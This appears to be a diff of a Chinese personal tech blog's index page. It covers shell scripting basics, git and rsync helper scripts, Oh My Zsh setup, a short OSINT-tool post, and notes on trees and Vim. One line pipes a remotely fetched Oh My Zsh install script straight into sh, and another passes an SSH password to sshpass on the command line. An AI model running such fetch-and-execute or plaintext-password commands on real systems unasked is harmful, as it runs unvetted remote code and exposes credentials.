-<li>Fish Shell - 一个强调交互性和可用性的 UNIX shell 环境,与 Zsh 不同，Fish 旨在为用户提供交互性，而不是信任用户实现自己的配置</li>
-</ul>
-<blockquote>
-<p>Bash、Z Shell 和 Fish Shell 各有优点，也有一些相似之处。既然对它们有了更多的了解，你就可以在工作中更有效地使用它们。<br>如果你想要更可配置的 shell，你可以使用 Zsh（甚至安装 Oh My Zsh）。如果你想要更多交互的终端体验，同时不需要大量配置，你可以使用 Fish Shell。如果你想要经典的感觉，你可以保留 Bash。</p>
-</blockquote>
-<h2 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h2><h3 id="shell-基础"><a href="#shell-基础" class="headerlink" title="shell 基础"></a>shell 基础</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `<span class="built_in">ls</span> /etc`</span><br><span class="line">或</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> $(<span class="built_in">ls</span> /etc)</span><br><span class="line"><span class="comment"># 以上语句将 /etc 下目录的文件名循环出来。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字符串长度 &#123;#&#125;</span></span><br><span class="line"><span class="comment"># $&#123;#string&#125; 等价于 $&#123;#string[0]&#125;:</span></span><br><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span>   <span class="comment"># 输出 4</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string[0]&#125;</span>   <span class="comment"># 输出 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运算符</span></span><br><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;两数之和为 : <span class="variable">$val</span>&quot;</span> <span class="comment"># 输出 两数之和为 : 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f  file ]    <span class="comment"># 如果 文件存在</span></span><br><span class="line"><span class="keyword">if</span> [ -d ...   ]    <span class="comment"># 如果 目录存在</span></span><br><span class="line"><span class="keyword">if</span> [ -s file  ]    <span class="comment"># 如果 文件存在且非空 </span></span><br><span class="line"><span class="keyword">if</span> [ -r file  ]    <span class="comment"># 如果 文件存在且可读</span></span><br><span class="line"><span class="keyword">if</span> [ -w file  ]    <span class="comment"># 如果 文件存在且可写</span></span><br><span class="line"><span class="keyword">if</span> [ -x file  ]    <span class="comment"># 如果 文件存在且可执行   </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数变量表达式</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -eq int2 ]    <span class="comment"># 如果 int1等于int2   </span></span><br><span class="line"><span class="keyword">if</span> [ int1 -ne int2 ]    <span class="comment"># 如果 不等于    </span></span><br><span class="line"><span class="keyword">if</span> [ int1 -ge int2 ]    <span class="comment"># 如果 &gt;=</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -gt int2 ]    <span class="comment"># 如果 &gt;</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -le int2 ]    <span class="comment"># 如果 &lt;=</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -lt int2 ]    <span class="comment"># 如果 &lt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 字符串变量表达式</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$a</span> = <span class="variable">$b</span> ]                 <span class="comment"># 如果string1等于string2</span></span><br><span class="line">                                <span class="comment"># 字符串允许使用赋值号做等号</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$string1</span> !=  <span class="variable">$string2</span> ]   <span class="comment"># 如果string1不等于string2       </span></span><br><span class="line"><span class="keyword">if</span>  [ -n <span class="variable">$string</span>  ]             <span class="comment"># 如果string 非空(非0），返回0(true)  </span></span><br><span class="line"><span class="keyword">if</span>  [ -z <span class="variable">$string</span>  ]             <span class="comment"># 如果string 为空</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$sting</span> ]                  <span class="comment"># 如果string 非空，返回0 (和-n类似) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nohup 防止进程被挂起或终端结束</span></span><br><span class="line"><span class="built_in">nohup</span> sshpass -p <span class="string">&quot;<span class="variable">$&#123;passphrase&#125;</span>&quot;</span> ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -C -c aes128-gcm@openssh.com -fNg -L 9200:127.0.0.1:9200   ec2-user@xx.xx.xx &gt; /dev/null &amp;</span><br></pre></td></tr></table></figure>
+            <h2 id="系统文件迁移"><a href="#系统文件迁移" class="headerlink" title="系统文件迁移"></a>系统文件迁移</h2><p>安装必需工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install rsync mailutils  <span class="comment"># 对于 Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> yum install rsync mailx          <span class="comment"># 对于 CentOS</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="标准脚本"><a href="#标准脚本" class="headerlink" title="标准脚本"></a>标准脚本</h3><p>git 基本上传操作</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：显示使用说明</span></span><br><span class="line"><span class="function"><span class="title">show_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: ./update.sh [options]&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;This script updates file timestamps, stages changes, commits them to Git,&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;and pushes to the specified branch.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Options:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -h, --help          Show this help message and exit.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -c, --commit &lt;msg&gt;  Git commit message (default: &#x27;update&#x27;).&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -b, --branch &lt;name&gt; Git branch name (default: &#x27;main&#x27;).&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -f, --force         Force add all changes (including untracked files).&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认设置</span></span><br><span class="line">commit_message=<span class="string">&quot;update&quot;</span></span><br><span class="line">branch_name=<span class="string">&quot;main&quot;</span></span><br><span class="line">force_add=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析参数</span></span><br><span class="line"><span class="keyword">while</span> [[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]]; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span> )</span><br><span class="line">            show_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">            ;;</span><br><span class="line">        -c | --commit )</span><br><span class="line">            <span class="built_in">shift</span></span><br><span class="line">            commit_message=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">        -b | --branch )</span><br><span class="line">            <span class="built_in">shift</span></span><br><span class="line">            branch_name=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">        -f | --force )</span><br><span class="line">            force_add=<span class="literal">true</span></span><br><span class="line">            ;;</span><br><span class="line">        * )</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Unknown option: <span class="variable">$1</span>&quot;</span></span><br><span class="line">            show_help</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到 Git</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$force_add</span>; <span class="keyword">then</span></span><br><span class="line">    git add -A  <span class="comment"># 强制添加所有变化，包括未追踪的文件</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    git add .   <span class="comment"># 仅添加已追踪的文件的变化</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交变更并使用指定的提交信息</span></span><br><span class="line">git commit -m <span class="string">&quot;<span class="variable">$commit_message</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到指定的远程分支</span></span><br><span class="line">git push origin <span class="string">&quot;<span class="variable">$branch_name</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Mac-终端优化-（iTerm2-oh-my-zsh-powerlevel10k"><a href="#Mac-终端优化-（iTerm2-oh-my-zsh-powerlevel10k" class="headerlink" title="Mac 终端优化 （iTerm2 + oh my zsh + powerlevel10k)"></a>Mac 终端优化 （iTerm2 + oh my zsh + powerlevel10k)</h3><h4 id="安装-iTerm2-terminal的优化"><a href="#安装-iTerm2-terminal的优化" class="headerlink" title="安装 iTerm2 -&gt; terminal的优化"></a>安装 <em><strong>iTerm2</strong></em> -&gt; terminal的优化</h4><p><a target="_blank" rel="noopener" href="https://iterm2.com/">iTerm2</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1757146">iTerm2 - 解决文本复制不了问题</a></p>
-<h4 id="安装-oh-my-zsh-zsh的优化"><a href="#安装-oh-my-zsh-zsh的优化" class="headerlink" title="安装 oh my zsh -&gt; zsh的优化"></a>安装 <em><strong>oh my zsh</strong></em> -&gt; zsh的优化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2303773">Oh-my-zsh主题乱码解决办法</a></p>
-<h4 id="安装-powerlevel10k-主题"><a href="#安装-powerlevel10k-主题" class="headerlink" title="安装 powerlevel10k 主题"></a>安装 <em><strong>powerlevel10k</strong></em> 主题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$ZSH_CUSTOM</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment">## 或者</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./.oh-my-zsh/themes</span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/romkatv/powerlevel10k.git</span><br></pre></td></tr></table></figure>
-
-<p>vi ~&#x2F;.zshrc 设置如下内容 使用p10k主题 ZSH_THEME&#x3D;”powerlevel10k&#x2F;powerlevel10k”</p>
-<h4 id="安装语法高亮插件和自动补全插件"><a href="#安装语法高亮插件和自动补全插件" class="headerlink" title="安装语法高亮插件和自动补全插件"></a>安装语法高亮插件和自动补全插件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-
-<p>vi ~&#x2F;.zshrc 在插件配置处添加下载的这两个插件名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">     git</span><br><span class="line">     zsh-syntax-highlighting</span><br><span class="line">     zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<h3 id="重新选择风格"><a href="#重新选择风格" class="headerlink" title="重新选择风格"></a>重新选择风格</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure>
+<p>backup_and_migrate.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要变量</span></span><br><span class="line">SOURCE_USER=<span class="string">&quot;source_user&quot;</span></span><br><span class="line">SOURCE_HOST=<span class="string">&quot;source_host&quot;</span></span><br><span class="line">SOURCE_DIR=<span class="string">&quot;/path/to/source/directory/&quot;</span></span><br><span class="line">TARGET_USER=<span class="string">&quot;target_user&quot;</span></span><br><span class="line">TARGET_HOST=<span class="string">&quot;target_host&quot;</span></span><br><span class="line">TARGET_DIR=<span class="string">&quot;/path/to/target/directory/&quot;</span></span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/path/to/backup/directory/&quot;</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;migration.log&quot;</span></span><br><span class="line">EMAIL_RECIPIENT=<span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;创建备份...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$BACKUP_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查备份成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份成功，保存在 <span class="variable">$BACKUP_DIR</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Backup Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行迁移</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;开始迁移...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$TARGET_USER</span>@<span class="variable">$TARGET_HOST</span>:<span class="variable">$TARGET_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查迁移成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移成功！从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份和迁移成功！日志详情见 <span class="variable">$LOG_FILE</span>&quot;</span> | mail -s <span class="string">&quot;Server Migration Success&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Migration Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出完成信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份和迁移完成：从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span> 和 <span class="variable">$BACKUP_DIR</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="mongo-数据迁移"><a href="#mongo-数据迁移" class="headerlink" title="mongo 数据迁移"></a>mongo 数据迁移</h2><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/zh-cn/docs/ops-manager/current/tutorial/migrate-member-to-new-hardware/">将副本集成员迁移到新服务器</a></p>
 
         </div>
     
@@ -1109,8 +1071,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/05/28/social-engineering/">
-                社工库工具
+            <a href="/2025/05/28/tree/">
+                树 ADT
             </a>
         </h1>
         <div class="post-info">
@@ -1120,7 +1082,7 @@
             
             
                 <span class="category">
-                    <a href="/categories/渗透/">渗透</a>
+                    <a href="/categories/AI/">AI</a>
                 </span>
             
         </div>
@@ -1128,12 +1090,333 @@
 
     
         <div class="content">
-            <p>国外情报专家最常用的OSINT工具</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool?tab=readme-ov-file#%E7%A4%BE%E5%B7%A5%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B1%BB">a</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.topgoer.cn/docs/offensive/offensive-1e1ht41abkse7">b</a></p>
+            <pre class="mermaid">graph LR
+    A[树] --> B[二叉树]
+    B[二叉树] --> C[完全二叉树]
+    C[完全二叉树] --> D[满二叉树]
+    C[完全二叉树] --> E[堆]
+    E[堆] --> F[大顶堆]
+    E[堆] --> G[小顶堆]
+    B[二叉树] --> H[二叉查找树]
+    B[二叉树] --> I[平衡二叉树]
+    B[二叉树] --> J[平衡二叉查找树]
+    J[平衡二叉查找树] --> K[红黑树]
+    J[平衡二叉查找树] --> L[AVL]
+    A[树] --> M[N叉树]
+    M[N叉树] --> N[B树]
+    M[N叉树] --> O[B+树]</pre>
+
+<p><img src="/images/tree.png"></p>
+<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>每一个节点最多两个子节点</p>
+<p><img src="/images/tree-ercha.png"></p>
+<p>前序遍历<br>遍历顺序是根节点-&gt;左子树-&gt;右子树<br>遍历的得到的序列是：<code>1 2 4 5 3 6 7</code></p>
+<p>中序遍历<br>遍历顺序是左子树-&gt;根节点-&gt;右子树<br>遍历的得到的序列是：<code>4 2 5 1 6 3 7</code></p>
+<p>后序遍历<br>遍历顺序是左子树-&gt;右子树-&gt;根节点<br>遍历的得到的序列是：<code>4 5 2 6 7 3 1</code></p>
+<p>满二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底层</span><br><span class="line">2.除了叶子节点，每个节点都有左、由两个子节点</span><br></pre></td></tr></table></figure>
+
+<p>完全二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底下两层</span><br><span class="line">2.最后一层的子节点，都靠左排列</span><br><span class="line">3.除了最后一层，其它层的节点个数，都要达到最大</span><br></pre></td></tr></table></figure>
+
+<p>二叉查找树</p>
+<p><img src="/images/tree-erchachaozhao.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.树中的每一个节点的值</span><br><span class="line">2.都要大于左子树中每个节点的值</span><br><span class="line">3.都要小于右子树中每个节点的值</span><br></pre></td></tr></table></figure>
+
+<p>AVL树</p>
+<p><img src="/images/tree-erchachazhao-to-avl.png"></p>
+<p>红黑树</p>
+<p><img src="/images/tree-honghei.png"></p>
+<p>B树</p>
+<p>B+树</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2025/05/28/vim/">
+                VIM
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2025-05-28</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Linux/">Linux</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>Vi编辑器是所有Unix及Linux系统下标准的编辑器，</p>
+<p>vi和vim都是Linux中的编辑器，不同的是，vim比较高级，可以视为vi的升级版本。vi使用于文本编辑，但是vim更适用于coding（写代码的）。</p>
+<p>Vim重点是光标的移动，模式切换，删除，查找，替换，复制，粘贴，撤销命令的使用。</p>
+<h2 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h2><p><img src="/images/vim-console.png"></p>
 <ul>
-<li><em><strong>Sherlock</strong></em> 是社交媒体账户追踪（爬虫）工具，可用于收集有关人员的信息，对记者和安全研究人员特别有用</li>
+<li>命令模式：在该模式下是不能对文件直接编辑，可以输入快捷键进行一些操作（删除行，复制行，移动光标，粘贴等等）【打开文件之后默认进入的模式】；</li>
+<li>编辑模式：在该模式下可以对文件的内容进行编辑；</li>
+<li>末行模式：可以在末行输入命令来对文件进行操作（搜索、替换、保存、退出、撤销、高亮等等）；</li>
 </ul>
+<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><p><img src="/images/vim-to.png"></p>
+<ul>
+<li>行首 <code>按键shift + 6 或 ^</code></li>
+<li>行尾 <code>按键shift + 4 或 $</code></li>
+<li>首行 <code>gg</code></li>
+<li>末行 <code>G</code></li>
+<li>翻屏 <ul>
+<li>向上翻屏 <code>按键ctrl + b</code> （before） 或 <code>PgUp</code></li>
+<li>向下翻屏 <code>按键ctrl + f</code> （after） 或 <code>PgDn</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="复制操作"><a href="#复制操作" class="headerlink" title="复制操作"></a>复制操作</h4><ul>
+<li>所在行 <code>yy</code> </li>
+<li>粘贴：在想要粘贴的地方按下<code>p</code>键</li>
+</ul>
+<h4 id="剪切-删除"><a href="#剪切-删除" class="headerlink" title="剪切&#x2F;删除"></a>剪切&#x2F;删除</h4><ul>
+<li>剪切&#x2F;删除光标所在行 <code>dd</code></li>
+<li>剪切&#x2F;删除光标所在的当前行之后的内容，但是删除之后下一行不上移 <code>D</code></li>
+</ul>
+<h4 id="撤销-恢复"><a href="#撤销-恢复" class="headerlink" title="撤销&#x2F;恢复"></a>撤销&#x2F;恢复</h4><ul>
+<li>撤销 <code>u</code> （undo）</li>
+<li>撤销5个改变 <code>:undo 5</code></li>
+<li>你的撤销历史 <code>:undolist</code></li>
+<li>重做最后的改动 <code>按键ctrl + r:</code></li>
+<li>取消当前行中所有的改动 <code>U:</code></li>
+<li>回到4分钟前 <code>:earlier 4m</code></li>
+<li>前进55秒 <code>:later 55s</code></li>
+</ul>
+<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><p>r: 替换光标处的字符，同样支持汉字。<br>R: 进入替换模式，按esc回到正常模式。</p>
+<h3 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h3><p>进入方式：由命令模式进入，按下<code>:</code>或者<code>/（表示查找）</code>即可进入<br>退出方式：</p>
+<ol>
+<li>按下<code>按键esc</code></li>
+<li>连按2次<code>按键esc</code>键</li>
+<li>删除末行全部输入字符</li>
+</ol>
+<ul>
+<li>保存文件<code>:w</code></li>
+<li>另存为<code>:w 路径</code></li>
+<li>退出文件<code>:q</code></li>
+<li>保存并且退出<code>:wq</code></li>
+<li>表示强制退出，刚才做的修改操作不做保存<code>:q!</code></li>
+<li><code>:!外部命令</code></li>
+<li><code>/关键词</code> 搜索查找</li>
+<li>替换 -&gt; %表示整个文件 g表示全局（global）<ul>
+<li><code>:s/搜索的关键词/新的内容</code> (替换光标所在行的第一处符合条件的内容)</li>
+<li><code>:s/搜索的关键词/新的内容/g</code> (替换光标所在行的全部符合条件的内容)</li>
+<li><code>:%s/搜索的关键词/新的内容</code> (替换整个文档中每行第一个符合条件的内容)</li>
+<li><code>:%s/搜索的关键词/新的内容/g</code> (替换整个文档的符合条件的内容)</li>
+</ul>
+</li>
+<li>显示行号（临时）<ul>
+<li><code>:set nu</code>[number]</li>
+<li><code>:set nonu</code></li>
+</ul>
+</li>
+<li>文件多开<code>:files</code> <ul>
+<li>果需要指定切换文件的名称，则可以输入<code>:open 已经打开的文件名</code></li>
+<li>“:bn”切换到下一个文件（back next）<code></code></li>
+<li>“:bp”切换到上一个文件（back prev）<code></code></li>
+</ul>
+</li>
+</ul>
+<h5 id="分屏功能"><a href="#分屏功能" class="headerlink" title="分屏功能"></a>分屏功能</h5><ul>
+<li><p>分屏</p>
+<ul>
+<li>水平方向分屏打开新文件 横向切分 <code>:sp</code>文件名 <code>:split</code>文件名</li>
+<li>垂直方向分屏打开新文件 竖向切分 <code>:vsp</code>文件名 <code>:vsplit</code>文件名</li>
+<li>上下分割当前打开的文件 <code>按键Ctrl+w s</code></li>
+<li>左右分割当前打开的文件 <code>按键Ctrl+w v</code></li>
+</ul>
+</li>
+<li><p>关闭分屏 </p>
+<ul>
+<li>关闭当前窗口<code>按键Ctrl+w c</code></li>
